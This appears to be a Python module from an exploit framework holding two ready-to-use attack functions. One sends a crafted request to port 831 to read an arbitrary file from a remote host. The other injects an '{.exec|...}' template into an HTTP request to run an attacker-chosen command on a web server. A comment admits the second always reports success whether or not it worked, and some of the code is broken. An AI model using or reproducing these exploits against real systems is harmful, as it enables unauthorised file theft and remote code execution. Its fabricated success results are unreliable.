import socket,sys

def execute_39102(options: dict):
	RHOST = options['RHOST']
	FILTETOREAD = options['FILETOREAD']
	PORT = 831
	file_to_read = FILTETOREAD

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((RHOST, PORT))
	file_to_read = "\x43" + file_to_read
	hex_value = ''.join(x.encode('hex') for x in file_to_read)
	fill = "\x00"
	end = "\x01\x00\x00\x00\x01"
	payload = hex_value.decode("hex") + fill * (261 - len(end) - len(file_to_read)) + end
	s.send(payload)
	s.settimeout(0)
	print("[+] Request Send Waiting for Response . . . [+]")

	try:
		data = s.recv(261) # Get header
		while data:
			data = s.recv(2048)
			return {'success': True, 'data': data}
			
	except Exception as ex:
		print("Exception: " + ex)
		return {'success': False, 'error': 'Exception occurred while fetching data...'}
	finally:			
		s.close()

# WARNING: This exploit is not verifiable and will always return Success
def execute_37985(options: dict):
      url = options['url']
      cmd = options['cmd']
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((url, 80))
      req = "GET /?{.exec|"+cmd+".}"
      req += " HTTP/1.1\r\n\r\n"
      sock.send(req)
      sock.close()
      return {'success': True, 'data': 'Exploit Executed Successfully'}